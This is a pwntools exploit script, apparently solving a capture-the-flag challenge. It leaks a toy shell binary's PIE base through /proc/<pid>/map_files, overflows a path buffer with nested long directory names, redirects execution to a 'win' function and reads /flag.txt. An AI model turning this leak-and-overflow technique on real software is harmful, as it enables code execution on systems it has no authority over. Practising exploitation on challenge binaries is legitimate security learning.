from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

binary = './app'
nc = 'nc 0.0.0.0 1337'
elf = context.binary = ELF(binary)

def make_and_cd(name):
	p.sendline(b'dirmake ' + name)
	p.sendline(b'dirchange ' + name)

gdbscript = """
	b * main
	disp/3i $pc
	c
"""

if len(sys.argv) == 1: p = process(binary)
elif sys.argv[1] == 'd': p = gdb.debug(binary, gdbscript)
elif sys.argv[1] == 'r': p = remote(nc.split(' ')[1], int(nc.split(' ')[2]))
else: p = process(binary); util.proc.wait_for_debugger(util.proc.pidof(p)[0])

win = 0x1549

# get pid
p.sendline(b'pid')
p.recvuntil(b'mysh> ');
pid = p.recvline()[:-1] # leave it as bytestring
print(pid)

# ls /proc/pid/map_files
p.sendline(b'dirlist /proc/' + pid + b'/map_files')
pie_base = p.recvuntil(b'-').split(b' ')[-1][:-1]
pie_base = int(pie_base.decode("ascii"), 16)
win = pie_base + win + 8 # skip prologue
print(hex(win))

# setup for buffer overflow
# create directories
make_and_cd(b'/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
make_and_cd(b'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB')
make_and_cd(b'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC/')
# now we have 511 letters + trailing slash

# overflow bytes
payload = b'BBBBBBBB' # rbp
payload += p64(win)
make_and_cd(payload)


# trigger buffer overflow
p.sendline(b'dirwhere')

p.sendline(b'cat /flag.txt')
p.interactive()
